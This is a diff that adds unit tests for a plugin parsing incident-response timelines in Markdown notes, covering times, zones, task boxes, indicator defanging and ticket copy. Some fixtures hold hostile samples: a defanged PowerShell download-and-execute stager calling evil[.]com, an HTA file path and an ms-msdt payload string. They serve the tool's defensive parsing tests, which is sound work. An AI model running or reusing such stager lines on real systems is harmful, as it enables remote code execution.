@@ -120,6 +120,68 @@ describe('findTimelines: the block', () => {
     expect(findTimelines(['```', TIMELINE_MARKER, '- a', '```'])).toEqual([])
     expect(findTimelines(['~~~~', '```', TIMELINE_MARKER, '~~~~', TIMELINE_MARKER, '- b'])).toHaveLength(1)
   })
+
+  it('ignores a marker inside YAML frontmatter', () => {
+    const note = ['---', 'tags:', '  %% timeline %%', '  - malware', '---', TIMELINE_MARKER, '- a']
+    expect(findTimelines(note).map((b) => b.markerLine)).toEqual([5])
+    // Not frontmatter: it does not start the note, or it never closes.
+    expect(findTimelines(['', '---', TIMELINE_MARKER, '- a', '---'])).toHaveLength(1)
+    expect(findTimelines(['---', TIMELINE_MARKER, '- a'])).toHaveLength(1)
+    expect(findTimelines(['---\r', 'a: 1', '  %% timeline %%', '  - x', '---\r'])).toEqual([])
+  })
+
+  it("takes a fenced code block in an event as its details, '#' lines and blank lines included", () => {
+    const b = block(
+      '- At 11:06, Execution: ran the stager',
+      '  ```powershell',
+      '  # stage 1',
+      '  iex (iwr hxxp://evil[.]com/a.ps1)',
+      '',
+      '',
+      '    - not a detail marker',
+      '  ```',
+      '- At 11:07 next',
+      '- At 11:05 earlier'
+    )
+    expect(b.events.map((e) => [e.line, e.lastLine])).toEqual([
+      [1, 8],
+      [9, 9],
+      [10, 10]
+    ])
+    expect(b.events[0].details.map((d) => d.text)).toEqual([
+      '```powershell',
+      '# stage 1',
+      'iex (iwr hxxp://evil[.]com/a.ps1)',
+      '  - not a detail marker',
+      '```'
+    ])
+    const tab = block('- At 11:06 ran:', '\t```', '\t$a = 1', '', '', '\t$b = 2', '\t```', '- At 11:05 x')
+    expect(tab.events.map((e) => e.lastLine)).toEqual([7, 8])
+  })
+
+  it('ends an unclosed fence in an event where Markdown ends the list item', () => {
+    const b = block('- a', '  ```', '  code', '', 'A paragraph.', '- b')
+    expect(b.events.map((e) => e.text)).toEqual(['a'])
+    expect(b.lastLine).toBe(3)
+    expect(block('- a', '  ```', '  code', '- b').events.map((e) => e.lastLine)).toEqual([3, 4])
+    // The blank lines it holds before the next event are in the item, so the event's; after the last, they are not.
+    expect(block('- a', '  ```', '  code', '', '', '- b').events.map((e) => e.lastLine)).toEqual([5, 6])
+    expect(block('- a', '  ```', '  code', '', '').lastLine).toBe(3)
+  })
+
+  it('takes a fence opened on the bullet itself as the code of that event, to its closing fence', () => {
+    const b = block('- ```powershell', '  # stage 1', '', '', '  iex $a', '  ```', '- At 11:07 next')
+    expect(b.events.map((e) => [e.line, e.lastLine])).toEqual([
+      [1, 6],
+      [7, 7]
+    ])
+    expect(b.events[0].details.map((d) => d.text)).toEqual(['# stage 1', 'iex $a', '```'])
+  })
+
+  it('never takes a code line in an event for a Source: footer', () => {
+    const b = block('- a', '  ```', '  Source: x', '  ```')
+    expect(b.events[0].details.map((d) => d.source)).toEqual([false, false, false])
+  })
 })
 
 describe('findTimelines: the time a bullet starts with', () => {
@@ -154,11 +216,28 @@ describe('findTimelines: the time a bullet starts with', () => {
     ['11:04pm', 1384],
     ['12:15 AM', 15],
     ['12:15 PM', 735],
-    ['1:04 PM', 784]
+    ['1:04 PM', 784],
+    ['2:29 P.M.', 869],
+    ['12:30 a.m.', 30],
+    ['11:04 a.m', 664],
+    ['1:50–2:10 p.m.', 830]
   ])('reads %s on a 12-hour clock', (raw, minutes) => {
     const e = one(`${raw}, x`)
     expect(e.time?.minutes).toBe(minutes)
     expect(e.time?.raw).toBe(raw)
+    expect(e.body).toBe('x')
+  })
+
+  it('leaves a full stop after AM to the sentence', () => {
+    expect(one('At 11:04 AM. The user clicked').time).toBeNull()
+    expect(one('At 11:04 AM. The user clicked').unread).toBe('11:04')
+  })
+
+  it('reads a dotted meridiem before a kind word as the 12-hour time it is', () => {
+    const b = block('- At 11:50 AM, a', '- At 2:29 P.M., Execution: payload ran.')
+    expect(b.events[1]).toMatchObject({ kind: 'execution', kindExplicit: true, body: 'payload ran.' })
+    expect(b.gaps[1]).toMatchObject({ label: '2 h 39 min later', outOfOrder: false })
+    expect(b.summary).toMatchObject({ first: '11:50 AM', last: '2:29 P.M.', span: '2 h 39 min' })
   })
 
   it.each([
@@ -188,6 +267,27 @@ describe('findTimelines: the time a bullet starts with', () => {
 
   it('keeps the zone after a range', () => {
     expect(one('11:06–11:08 UTC x').time).toMatchObject({ zone: 'UTC', minutes: 666, end: { minutes: 668 } })
+  })
+
+  it('never takes a small z or a word starting with Z for Zulu', () => {
+    expect(one('11:06 z').time?.zone).toBeNull()
+    expect(one('11:06 z').body).toBe('z')
+    expect(one('09:00 Z-score anomaly').body).toBe('Z-score anomaly')
+    expect(one('11:06 Z, x').time?.zone).toBe('Z')
+  })
+
+  it('keeps a US zone abbreviation as written', () => {
+    expect(one('07:10 EDT, x')).toMatchObject({ time: { raw: '07:10 EDT', zone: 'EDT', minutes: 430 }, body: 'x' })
+  })
+
+  it('reads the time after a task box, which stays part of the bullet', () => {
+    const e = block('- [x] At 11:05, Response: isolated host').events[0]
+    expect(e).toMatchObject({ textFrom: 6, text: 'At 11:05, Response: isolated host', kind: 'response' })
+    expect(e.time).toMatchObject({ raw: '11:05', minutes: 665 })
+    expect(block('  * [ ] 11:06 notify').events[0]).toMatchObject({ textFrom: 8, body: 'notify' })
+    expect(block('- [ ]').events[0]).toMatchObject({ textFrom: 5, text: '' })
+    // A link is not a task box.
+    expect(block('- [[Alert 4521]] fired').events[0].textFrom).toBe(2)
   })
 
   it('reads a date-only start as a date with no time', () => {
@@ -353,6 +453,27 @@ describe('findTimelines: indicators, ATT&CK, key events, details', () => {
     expect(one('mailed user@evil.com').iocs.map((i) => i.live)).toEqual([true])
   })
 
+  it('judges each indicator on its own, not by the word it sits in', () => {
+    const b = block('- At 11:05, seen 1.2.3.4,evil.com')
+    expect(b.events[0].iocs.map((i) => [i.type, i.live])).toEqual([
+      ['ip', true],
+      ['domain', false]
+    ])
+    expect(b.summary.live).toBe(1)
+    expect(block('- At 11:05, seen 1.2.3.4,evil.com,5.6.7.8').events[0].iocs.map((i) => i.live)).toEqual([
+      true,
+      false,
+      true
+    ])
+  })
+
+  it('counts every change Defang timeline would make, listed as an indicator or not', () => {
+    expect(block('- At 11:05, opened file://evil-share/x.hta').summary.live).toBe(1)
+    expect(block('- At 11:05, ran it', '    - Payload: ms-msdt:/id PCWDiagnostic').summary.live).toBe(1)
+    expect(block('- At 11:05, opened file[:]//evil-share/x[.]hta').summary.live).toBe(0)
+    expect(block('- At 11:05, evil.com', '- Download: promptcraft.online').summary.live).toBe(1)
+  })
+
   it('finds indicators on any line for the renderer', () => {
     const line = '    - The script called https://x.example.com/a'
     expect(indicatorSpans(line, 6).map((i) => line.slice(i.span.from, i.span.to))).toEqual(['https://x.example.com/a'])
@@ -487,6 +608,16 @@ describe('gaps', () => {
     expect(gaps('11:00 a', 'On 3 May 2025, b')).toEqual([null, null])
     expect(gaps('11:00 a', 'On 3 May 2025, 11:05 b')).toEqual([null, null])
   })
+
+  it('never measures between clocks written in different zones, or a zone and none', () => {
+    expect(gaps('At 11:04 UTC, alert', 'At 13:10 +02:00, response')).toEqual([null, null])
+    expect(gaps('2026-10-09T11:04:00Z alert', '2026-10-09T13:10:00+02:00 response')).toEqual([null, null])
+    expect(gaps('At 11:04 UTC, alert', 'At 07:10 EDT, response')).toEqual([null, null])
+    expect(gaps('At 11:04 UTC, alert', 'At 11:10, response')).toEqual([null, null])
+    expect(gaps('At 11:04 UTC, alert', 'At 11:10 utc, response')[1]?.label).toBe('+6 min')
+    const s = block('- At 11:04 UTC, alert', '- At 13:10 +02:00, response').summary
+    expect([s.first, s.last, s.span]).toEqual(['11:04 UTC', '13:10 +02:00', null])
+  })
 })
 
 describe('summary', () => {
@@ -560,6 +691,55 @@ describe('formatDay and copyForTicket', () => {
     expect(copyForTicket(block('- 11:00 a'))).toBe('Timeline (1 event)\n11:00      a')
     expect(copyForTicket(findTimelines([TIMELINE_MARKER])[0])).toBe('Timeline (0 events)')
   })
+
+  it('writes every change of written date when numeric and named dates mix', () => {
+    const lines = (text: string) => text.split('\n')
+    expect(
+      lines(copyForTicket(block('- At 10/9/26, 2:29 AM mail received.', '- On 12 October 2026, 09:00 Response: b')))
+    ).toEqual([
+      'Timeline, 10/9/26 (2 events)',
+      '2:29 AM    mail received.',
+      '12 October 2026',
+      '09:00      Response: b'
+    ])
+    expect(
+      lines(copyForTicket(block('- On 3 May 2025, 11:04 a', '- At 10/9/26, 2:29 AM b', '- On 3 May 2025, 11:10 c')))
+    ).toEqual([
+      'Timeline, 3 May 2025 (3 events)',
+      '11:04      a',
+      '10/9/26',
+      '2:29 AM    b',
+      '3 May 2025',
+      '11:10      c'
+    ])
+  })
+
+  it('puts a time with no date of its own before any date line', () => {
+    expect(copyForTicket(block('- 11:00 x', '- On 3 May 2025, 11:04 a')).split('\n')).toEqual([
+      'Timeline (2 events)',
+      '11:00      x',
+      '3 May 2025',
+      '11:04      a'
+    ])
+    // An untimed event says nothing about the day, so the first date still heads the copy.
+    expect(copyForTicket(block('- Response: x', '- On 3 May 2025, 11:04 a')).split('\n')[0]).toBe(
+      'Timeline, 3 May 2025 (2 events)'
+    )
+  })
+
+  it('copies the code in an event whole, its indent kept', () => {
+    const b = block('- 11:06 ran:', '  ```powershell', '  if ($a) {', '    iex $b', '  }', '  ```', '- 11:07 next')
+    expect(copyForTicket(b).split('\n')).toEqual([
+      'Timeline (2 events)',
+      '11:06      ran:',
+      '           ```powershell',
+      '           if ($a) {',
+      '             iex $b',
+      '           }',
+      '           ```',
+      '11:07      next'
+    ])
+  })
 })
 
 describe('dates written as numbers', () => {
@@ -603,5 +783,13 @@ describe('dates written as numbers', () => {
     const b = block('- On 10/9/26, the vendor account was compromised.')
     expect(b.events[0].time).toMatchObject({ dateText: '10/9/26', minutes: null })
     expect(b.summary.untimed).toBe(1)
+  })
+})
+
+describe('a list that changes bullet character', () => {
+  it('ends where Markdown starts a new list, so Live Preview and Reading view draw the same events', () => {
+    const b = findTimelines([TIMELINE_MARKER, '- 11:04 first', '- 11:05 second', '* 11:06 another list'])[0]
+    expect(b.events.map((e) => e.text)).toEqual(['11:04 first', '11:05 second'])
+    expect(b.lastLine).toBe(2)
   })
 })
